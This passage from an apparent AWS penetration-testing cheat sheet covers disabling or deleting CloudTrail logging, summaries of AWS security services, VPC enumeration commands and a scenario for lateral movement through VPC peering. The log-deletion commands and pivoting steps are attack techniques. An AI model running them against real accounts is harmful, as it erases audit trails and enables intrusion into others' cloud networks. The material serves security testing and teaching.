<div class="highlight"><pre><span></span><code><a id="__codelineno-231-1" name="__codelineno-231-1" href="#__codelineno-231-1"></a>aws cloudtrail delete-trail --name example_trail --profile name
</code></pre></div>
<h4 id="disable-monitoring-of-events-from-global-events">Disable monitoring of events from global events</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-232-1" name="__codelineno-232-1" href="#__codelineno-232-1"></a>aws cloudtrail update-trail --name example_trail --no-include-global-service-event
</code></pre></div>
<h4 id="disable-cloudtrail-on-specific-regions">Disable CloudTrail on specific regions</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-233-1" name="__codelineno-233-1" href="#__codelineno-233-1"></a>aws cloudtrail update-trail --name example_trail --no-include-global-service-event --no-is-multi-region --region=eu-west
</code></pre></div>
<h2 id="aws-shield">AWS Shield</h2>
<ul>
<li>Used to protect services from Denial of Service Attacks</li>
<li>There are 2 versions, the standard and the Advanced</li>
</ul>
<h2 id="aws-waf">AWS Waf</h2>
<ul>
<li>Used to protect applications against common web application attacks </li>
<li>Common WAF bypasses can be tested against it</li>
<li>To detect an WAF, we can use <code>wafw00f</code></li>
</ul>
<h2 id="aws-inspector">AWS Inspector</h2>
<ul>
<li>Automated security assessment service that helps improve the security and compliance of applications on AWS</li>
<li>Works with an agent </li>
</ul>
<h2 id="aws-guard-duty">AWS Guard Duty</h2>
<ul>
<li>Threat detection service that monitors for malicious activity and unauthorized behavior</li>
<li>Works by collecting and analyzing logs</li>
</ul>
<h2 id="virtual-private-cloud">Virtual Private Cloud</h2>
<ul>
<li>Used to create an isolated infrastructure within the cloud, including subnets and so on.</li>
<li>If the VPC has an internet gateway, means its a public subnet</li>
<li>Every VPC can have Network ACL's</li>
</ul>
<h2 id="routing-tables">Routing Tables</h2>
<p>A set of rules to determine where the traffic will be directed, comes in form of Destination and Target, defined as follows</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-234-1" name="__codelineno-234-1" href="#__codelineno-234-1"></a>DESTINATION TARGET
<a id="__codelineno-234-2" name="__codelineno-234-2" href="#__codelineno-234-2"></a>
<a id="__codelineno-234-3" name="__codelineno-234-3" href="#__codelineno-234-3"></a>IP          local -&gt; VPC Internal
<a id="__codelineno-234-4" name="__codelineno-234-4" href="#__codelineno-234-4"></a>IP          igw   -&gt; Internet Gateway
<a id="__codelineno-234-5" name="__codelineno-234-5" href="#__codelineno-234-5"></a>IP          nat   -&gt; NAT Gateway
<a id="__codelineno-234-6" name="__codelineno-234-6" href="#__codelineno-234-6"></a>IP          pcx   -&gt; VPC Peering
<a id="__codelineno-234-7" name="__codelineno-234-7" href="#__codelineno-234-7"></a>IP          vpce  -&gt; VPC Endpoint
<a id="__codelineno-234-8" name="__codelineno-234-8" href="#__codelineno-234-8"></a>IP          vgw   -&gt; VPN Gateway
<a id="__codelineno-234-9" name="__codelineno-234-9" href="#__codelineno-234-9"></a>IP          eni   -&gt; Network Interface
</code></pre></div>
<ul>
<li>VPC Internal -&gt; Internal IP, no internet connection</li>
<li>Internet Gateway -&gt; Used to access the internet</li>
<li>NAT Gateway -&gt; Does the NAT between machines, allows one way connection to the internet</li>
<li>VPC Peering -&gt; Allows the communication between 2 VPC's</li>
<li>VPC Endpoint -&gt; Used to access aws services without internet connection (Internet Gateway)</li>
<li>VPN Gateway -&gt; Used to expand the cloud to on premises and vice-versa</li>
<li>Network Interface -&gt; Network Interfaces</li>
</ul>
<h2 id="enumeration_7">Enumeration</h2>
<h3 id="listing-vpcs">Listing VPC's</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-235-1" name="__codelineno-235-1" href="#__codelineno-235-1"></a>aws ec2 describe-vpcs
</code></pre></div>
<h3 id="listing-vpcs-specifing-the-region">Listing VPC's specifing the region</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-236-1" name="__codelineno-236-1" href="#__codelineno-236-1"></a>aws ec2 describe-vpcs --region us-west-1
</code></pre></div>
<h3 id="listing-vpc-information-by-id">Listing VPC information by ID</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-237-1" name="__codelineno-237-1" href="#__codelineno-237-1"></a>aws ec2 describe-vpcs --filters &quot;Name=vpc-id,Values=ID&quot;
</code></pre></div>
<h3 id="listing-subnets">Listing subnet's</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-238-1" name="__codelineno-238-1" href="#__codelineno-238-1"></a>aws ec2 describe-subnets
</code></pre></div>
<h3 id="listing-subnets-by-vpc-id">Listing subnet's by VPC-id</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-239-1" name="__codelineno-239-1" href="#__codelineno-239-1"></a>aws ec2 describe-subnets --filters &quot;Name=vpc-id,Values=ID&quot;
</code></pre></div>
<h3 id="listing-routing-tables">Listing routing tables</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-240-1" name="__codelineno-240-1" href="#__codelineno-240-1"></a>aws ec2 describe-route-tables
</code></pre></div>
<h3 id="listing-routing-tables-by-vpc-id">Listing routing tables by VPC-id</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-241-1" name="__codelineno-241-1" href="#__codelineno-241-1"></a>aws ec2 describe-route-tables --filters &quot;Name=vpc-id,Values=ID&quot;
</code></pre></div>
<h3 id="listing-network-acls">Listing Network ACL's</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-242-1" name="__codelineno-242-1" href="#__codelineno-242-1"></a>aws ec2 describe-network-acls
</code></pre></div>
<h2 id="lateral-movement-and-pivoting">Lateral Movement and Pivoting</h2>
<ul>
<li>We can abuse VPC peering to do lateral movement</li>
</ul>
<h3 id="scenario">Scenario</h3>
<ul>
<li>There are 3 VPC's -&gt; A,B,C </li>
<li>A can access B through peering and B access C. We can use VPC B as a peering pivot to access VPC C from VPC A.</li>
<li>The lateral movement can be done if we gather keys or other machines </li>
<li>Always enumerate the subnets to see in which subnet we can access other VPC's</li>
</ul>
<h4 id="listing-vpc-peering-connections">Listing VPC peering connections</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-243-1" name="__codelineno-243-1" href="#__codelineno-243-1"></a>aws ec2 describe-vpc-peering-connections
</code></pre></div>
<h4 id="listing-subnets-of-specific-vpc-important-because-the-access-can-be-restricted-to-specific-subnets-to-other-vpcs">Listing subnets of specific VPC (Important because the access can be restricted to specific subnets to other VPC's)</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-244-1" name="__codelineno-244-1" href="#__codelineno-244-1"></a>aws ec2 describe-subnets --filters &quot;Name=vpc-id,Values=ID&quot;
</code></pre></div>
<h4 id="listing-routing-tables_1">Listing routing tables</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-245-1" name="__codelineno-245-1" href="#__codelineno-245-1"></a>aws ec2 describe-route-tables --filters &quot;Name=vpc-id,Values=ID&quot;
</code></pre></div>
<h4 id="listing-instances-on-the-specified-vpc-id">Listing instances on the specified VPC ID</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-246-1" name="__codelineno-246-1" href="#__codelineno-246-1"></a>aws ec2 describe-instances --filters &quot;Name=vpc-id,Values=ID&quot;
</code></pre></div>
<h4 id="listing-instances-on-the-specified-subnet">Listing instances on the specified subnet</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-247-1" name="__codelineno-247-1" href="#__codelineno-247-1"></a>aws ec2 describe-instances --filters &quot;Name=subnet-id,Values=ID&quot;
</code></pre></div>
<h2 id="references">References</h2>
<ul>
<li><a href="https://akimbocore.com/article/introduction-to-penetration-testing-aws/">An introduction to penetration testing AWS - Akimbocore</a></li>
<li><a href="https://www.cyberark.com/threat-research-blog/cloud-shadow-admin-threat-10-permissions-protect/">Cloud Shadow Admin Threat 10 Permissions Protect - CyberArk</a></li>
<li><a href="https://github.com/toniblyx/my-arsenal-of-aws-security-tools">My arsenal of AWS Security tools - toniblyx</a></li>
<li><a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/">AWS Privilege Escalation method mitigation - RhinoSecurityLabs</a></li>
<li><a href="https://gist.github.com/apolloclark/b3f60c1f68aa972d324b">AWS CLI Cheatsheet - apolloclark</a></li>
<li><a href="https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/">Pacu Open source AWS Exploitation framework - RhinoSecurityLabs</a></li>
<li><a href="https://www.youtube.com/watch?v=XfetW1Vqybw&amp;feature=youtu.be&amp;list=PLBID4NiuWSmfdWCmYGDQtlPABFHN7HyD5">PACU Spencer Gietzen - 30 juil. 2018</a></li>
<li><a href="https://pumascan.com/resources/cloud-security-instance-metadata/">Cloud security instance metadata - PumaScan</a></li>
<li><a href="https://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6">Privilege escalation in the Cloud: From SSRF to Global Account Administrator - Maxime Leblanc - Sep 1, 2018</a></li>
<li><a href="https://www.magnussen.funcmylife.fr/article_35">AWS - Cheatsheet - @Magnussen</a></li>
<li><a href="https://www.secsignal.org/en/news/how-i-hacked-a-whole-ec2-network-during-a-penetration-test/">HOW I HACKED A WHOLE EC2 NETWORK DURING A PENETRATION TEST - by Federico Fernandez</a></li>
<li><a href="https://devopscube.com/mount-ebs-volume-ec2-instance/">How to Attach and Mount an EBS volume to EC2 Linux Instance - AUGUST 17, 2016</a></li>
<li><a href="https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed">Getting shell and data access in AWS by chaining vulnerabilities - Riyaz Walikar - Aug 29, 2019 </a></li>
<li><a href="https://blog.appsecco.com/getting-started-with-version-2-of-aws-ec2-instance-metadata-service-imdsv2-2ad03a1f3650">Getting started with Version 2 of AWS EC2 Instance Metadata service (IMDSv2) - Sunesh Govindaraj - Nov 25, 2019</a></li>
<li><a href="https://blog.netspi.com/gaining-aws-console-access-via-api-keys/">Gaining AWS Console Access via API Keys - Ian Williams - March 18th, 2020</a></li>
<li><a href="https://gist.github.com/kmcquade/33860a617e651104d243c324ddf7992a">AWS API calls that return credentials - kmcquade</a></li>
</ul>

  <hr>
<div class="md-source-file">
  <small>
    
      Last update:
      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">February 1, 2023</span>
      
    
  </small>
</div>





                
              </article>
            </div>
          
          
        </div>
        
          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
            Back to top
          </a>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tracking", "toc.integrate", "navigation.top"], "search": "../../assets/javascripts/workers/search.208ed371.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.b78d2936.min.js"></script>
      
    
  </body>
</html>